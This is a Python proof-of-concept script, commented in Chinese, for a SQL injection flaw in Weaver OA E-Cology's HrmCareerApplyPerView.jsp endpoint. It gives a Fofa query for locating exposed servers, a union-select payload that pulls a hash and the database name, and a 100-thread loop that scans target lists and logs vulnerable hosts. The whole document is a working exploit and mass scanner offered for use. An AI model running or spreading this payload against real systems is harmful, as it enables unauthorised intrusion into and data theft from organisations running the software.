#泛微OA E-Cology HrmCareerApplyPerView SQL注入漏洞

#Fofa语法: app="泛微-OA（e-cology）"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
 _____      ____  ____  _     ____  ________  _
/  __/     /   _\/  _ \/ \   /  _ \/  __/\  \//
|  \ _____ |  /  | / \|| |   | / \|| |  _ \  / 
|  /_\____\|  \__| \_/|| |_/\| \_/|| |_// / /  
\____\     \____/\____/\____/\____/\____\/_/                                                                                                                                    
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微OA E-Cology")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200 and "javascript" in res.text:
            print(f"f[+]该url存在SQL注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在SQL注入漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()